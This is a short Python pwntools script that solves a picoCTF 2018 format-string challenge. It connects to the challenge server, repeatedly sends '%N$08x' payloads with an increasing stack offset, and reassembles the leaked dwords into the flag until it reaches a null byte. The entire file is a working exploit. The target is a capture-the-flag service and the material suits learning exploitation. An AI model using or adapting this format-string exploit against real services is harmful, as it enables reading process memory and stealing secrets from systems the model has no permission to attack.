#! /usr/bin/env python
from pwn import *

t = remote("2018shell2.picoctf.com", 34802)


# Offset is 4 bytes
# Since offset 11 is at buf[64]
# So 64/4 more will reach flag[64]
offset = 11 + 64/4
flag = ''

while True:
	# Send format string
	t.recvuntil("> ")
	t.sendline("%" + str(offset) + "$08x")

	# Receive the dword
	dword = t.recvline().strip()
	print "Received:", dword

	# parse into string
	flag += p32(int(dword, 16))
	print "Progress:", flag

	# offset for next dword
	offset +=1
	if '\x00' in flag:
		quit()
